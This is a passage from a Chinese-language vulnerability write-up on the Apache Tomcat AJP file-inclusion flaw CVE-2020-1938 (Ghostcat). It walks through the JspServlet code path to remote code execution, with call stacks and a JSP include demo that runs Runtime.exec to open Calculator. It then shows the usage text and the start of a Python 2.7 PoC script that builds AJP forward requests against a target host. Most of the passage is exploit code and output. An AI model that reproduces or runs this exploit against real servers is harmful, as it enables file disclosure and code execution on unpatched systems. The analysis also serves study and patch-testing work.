(org.apache.catalina.valves)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:476, AjpProcessor (org.apache.coyote.ajp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">process:66, AbstractProcessorLight (org.apache.coyote)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:745, Thread (java.lang)</span></p><h3 class="cs868C439D">
			<a name="rce"><span class="csD1E291E2">RCE</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboard&quot;HTTP/1.1&quot; &quot;/1.jsp&quot; 127.0.0.1 localhost porto 8009 false &quot;Cookie:AAAA=BBBB&quot; &quot;javax.servlet.include.request_uri:/&quot;,&quot;javax.servlet.include.path_info:1.txt&quot;,&quot;javax.servlet.include.servlet_path:/upload/&quot;</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">org/apache/jasper/servlet/JspServlet#service</span><span class="cs9C1B1871">负责处理</span><span class="cs9FB05234">xxx.jsp</span><span class="cs9C1B1871">访问逻辑，跟进来</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">jspUri</span><span class="cs8926E06"> </span><span class="cs9C1B1871">是通过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">servlet_path</span><span class="cs8926E06"> </span><span class="cs9C1B1871">和</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">path_info</span><span class="cs8926E06"> </span><span class="cs9C1B1871">拼接而来的。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image16.png" width="560" height="134" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">之后便会进入</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">serviceJspFile</span><span class="cs8926E06"> </span><span class="cs9C1B1871">逻辑进行处理。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image17.png" width="560" height="104" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟进</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">serviceJspFile</span><span class="cs8926E06"> </span><span class="cs9C1B1871">方法，首先先通过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">getResource</span><span class="cs8926E06"> </span><span class="cs9C1B1871">获取上传文件的内容，然后再通过初始化</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">wrapper</span><span class="cs8926E06"> </span><span class="cs9C1B1871">对象传入相关参数，然后再调用</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">JspServletWrapper#service</span><span class="cs8926E06"> </span><span class="cs9C1B1871">进行解析。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image18.png" width="560" height="151" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这简单解释一下，</span><span class="cs5BEC2C28">RCE</span><span class="cs8926E06"> </span><span class="cs9C1B1871">的核心需要进入的</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">JspServlet</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，我们平常访问</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">xxx.jsp</span><span class="cs8926E06"> </span><span class="cs9C1B1871">是进入到</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">Jspservlet</span><span class="cs8926E06"> </span><span class="cs9C1B1871">，</span><span class="cs8926E06">poc</span><span class="cs9C1B1871">中访问</span><span class="cs9FB05234">/1.jsp</span><span class="cs9C1B1871">通过</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">AJP</span><span class="cs8926E06"> </span><span class="cs9C1B1871">发包的过程中实际上就是我们的</span><span class="cs8926E06">Get</span><span class="cs9C1B1871">请求访问</span><span class="cs9FB05234">www.xxx.com/1.jsp</span><span class="cs9C1B1871">，所以这里自然进入了</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">JspServlet</span><span class="cs8926E06"> </span><span class="cs9C1B1871">当中，然后再配合</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">getResource</span><span class="cs8926E06"> </span><span class="cs9C1B1871">获取上传的文件内容，调用</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">Jsp</span><span class="cs8926E06"> </span><span class="cs9C1B1871">引擎进行解析，自然达到了</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">的效果。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">最后附上</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">的调用栈</span></p><p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboardexec:347, Runtime (java.lang)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">_jspService:1, _1_txt (org.apache.jsp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:70, HttpJspBase (org.apache.jasper.runtime)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:741, HttpServlet (javax.servlet.http)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:476, JspServletWrapper (org.apache.jasper.servlet)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">serviceJspFile:386, JspServlet (org.apache.jasper.servlet)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:330, JspServlet (org.apache.jasper.servlet)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:741, HttpServlet (javax.servlet.http)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doFilter:52, WsFilter (org.apache.tomcat.websocket.server)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:199, StandardWrapperValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:96, StandardContextValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:493, AuthenticatorBase (org.apache.catalina.authenticator)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:137, StandardHostValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:81, ErrorReportValve (org.apache.catalina.valves)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:660, AbstractAccessLogValve (org.apache.catalina.valves)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">invoke:87, StandardEngineValve (org.apache.catalina.core)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">service:476, AjpProcessor (org.apache.coyote.ajp)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">process:66, AbstractProcessorLight (org.apache.coyote)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">process:808, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">doRun:1498, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">run:745, Thread (java.lang)</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">后话</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我试了一下</span><span class="cs8926E06">jsp</span><span class="cs9C1B1871">的文件包含，这个</span><span class="cs8926E06">demo</span><span class="cs9C1B1871">下也是可以的，所以实际上</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">就是</span><span class="cs8926E06">jsp</span><span class="cs9C1B1871">的文件包含搞的鬼，要先上传一个文件，这个文件路径可被包含，然后读取模版解析，最后</span><span class="cs8926E06">RCE</span><span class="cs9C1B1871">。</span></p><p class="cs3A447A38"><span class="cs9FB05234">Copy to clipboard//1.jsp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%@ include file=&quot;1.txt&quot; %&gt;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">//1.txt</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;%@ Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;);%&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">另外前面可能有师傅会问为什么是</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">，原因是下面这个</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">有</span><span class="cs9FB05234">forwardrequest 2</span><span class="cs9C1B1871">，根据</span><span class="cs8926E06">AJP</span><span class="cs9C1B1871">数据包格式</span><span class="cs7FFD2630">第</span><span class="cs9FB05234">6</span><span class="cs7FFD2630">个字节</span><span class="cs9FB05234">(02)</span><span class="cs7FFD2630">代表是</span><span class="cs9FB05234">Get</span><span class="cs7FFD2630">请求</span><span class="cs9C1B1871">。另外在</span><span class="cs8926E06">Tomcat</span><span class="cs9C1B1871">中也有相关映射关系，在</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">AjpProcessor</span><span class="cs8926E06"> </span><span class="cs9C1B1871">做</span><span class="cs8926E06"> </span><span class="cs5BEC2C28">prepareRequest</span><span class="cs8926E06"> </span><span class="cs9C1B1871">处理的时候会根据字节选择相关的请求方式。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Tomcat/%ef%bc%88CVE-2020-1938%ef%bc%89Apache%20Tomcat%20%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e_files/image19.png" width="560" height="97" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">(py27)&gt; python .\cve-2020-1938-poc.py -h</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">usage: cve-2020-1938-poc.py [-h] [-p PORT] [-w WEBAPP] [-f FILE] [-l] target</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">positional arguments:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;target &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hostname or IP to attack</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">optional arguments:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-h, --help &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;show this help message and exit</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-p PORT, --port PORT &nbsp;AJP port to attack (default is 8009)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-w WEBAPP, --webapp WEBAPP</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Which webapp to attack (default is ROOT</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-f FILE, --file FILE &nbsp;file path :(WEB-INF/web.xml)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;-l, --lfi &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;local file include</span></p><h3 class="cs868C439D">
			<a name="python27"><span class="csD1E291E2">python2.7</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/env python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CNVD-2020-10487 &nbsp;Tomcat-Ajp lfi</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Based on: https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">#</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Some references:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import socket</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import struct</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def pack_string(s):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if s is None:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return struct.pack(&quot;&gt;h&quot;, -1)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;l = len(s)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return struct.pack(&quot;&gt;H%dsb&quot; % l, l, s.encode(&#39;utf8&#39;), 0)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def unpack(stream, fmt):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size = struct.calcsize(fmt)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;buf = stream.read(size)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return struct.unpack(fmt, buf)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def unpack_string(stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;size, = unpack(stream, &quot;&gt;h&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if size == -1: &nbsp;# null string</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res, = unpack(stream, &quot;%ds&quot; % size)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;stream.read(1) &nbsp;# \0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return res</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class NotFoundException(Exception):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class AjpBodyRequest(object):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# server == web server, container == servlet</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;MAX_REQUEST_LENGTH = 8186</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __init__(self, data_stream, data_len, data_direction=None):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data_stream = data_stream</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data_len = data_len</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data_direction = data_direction</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def serialize(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if len(data) == 0:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, 0x00)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = struct.pack(&quot;&gt;H&quot;, len(data))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res += data</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header = struct.pack(&quot;&gt;bbH&quot;, 0x12, 0x34, len(res))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;header = struct.pack(&quot;&gt;bbH&quot;, 0x41, 0x42, len(res))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return header + res</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def send_and_receive(self, socket, stream):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while True:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data = self.serialize()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socket.send(data)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = AjpResponse.receive(stream)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while r.prefix_code != AjpResponse.GET_BODY_CHUNK and r.prefix_code != AjpResponse.SEND_HEADERS:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = AjpResponse.receive(stream)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if r.prefix_code == AjpResponse.SEND_HEADERS or len(data) == 4:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">class AjpForwardRequest(object):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;28)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;REQUEST_METHODS = {&#39;GET&#39;: GET, &#39;POST&#39;: POST, &#39;HEAD&#39;: HEAD,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;OPTIONS&#39;: OPTIONS, &#39;PUT&#39;: PUT, &#39;DELETE&#39;: DELETE, &#39;TRACE&#39;: TRACE}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# server == web server, container == servlet</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;COMMON_HEADERS = [&quot;SC_REQ_ACCEPT&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;SC_REQ_ACCEPT_CHARSET&quot;, &quot;SC_REQ_ACCEPT_ENCODING&quot;, &quot;SC_REQ_ACCEPT_LANGUAGE&quot;, &quot;SC_REQ_AUTHORIZATION&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;SC_REQ_CONNECTION&quot;, &quot;SC_REQ_CONTENT_TYPE&quot;, &quot;SC_REQ_CONTENT_LENGTH&quot;, &quot;SC_REQ_COOKIE&quot;, &quot;SC_REQ_COOKIE2&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;SC_REQ_HOST&quot;, &quot;SC_REQ_PRAGMA&quot;, &quot;SC_REQ_REFERER&quot;, &quot;SC_REQ_USER_AGENT&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ATTRIBUTES = [&quot;context&quot;, &quot;servlet_path&quot;, &quot;remote_user&quot;, &quot;auth_type&quot;, &quot;query_string&quot;, &quot;route&quot;,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;ssl_cert&quot;, &quot;ssl_cipher&quot;, &quot;ssl_session&quot;, &quot;req_attribute&quot;, &quot;ssl_key_size&quot;, &quot;secret&quot;, &quot;stored_method&quot;]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __init__(self, data_direction=None):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.prefix_code = 0x02</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.method = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.protocol = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.req_uri = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.remote_addr = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.remote_host = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.server_name = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.server_port = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.is_ssl = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.num_headers = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.request_headers = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.attributes = None</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.data_direction = data_direction</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def pack_headers(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.num_headers = len(self.request_headers)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = &quot;&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;res = 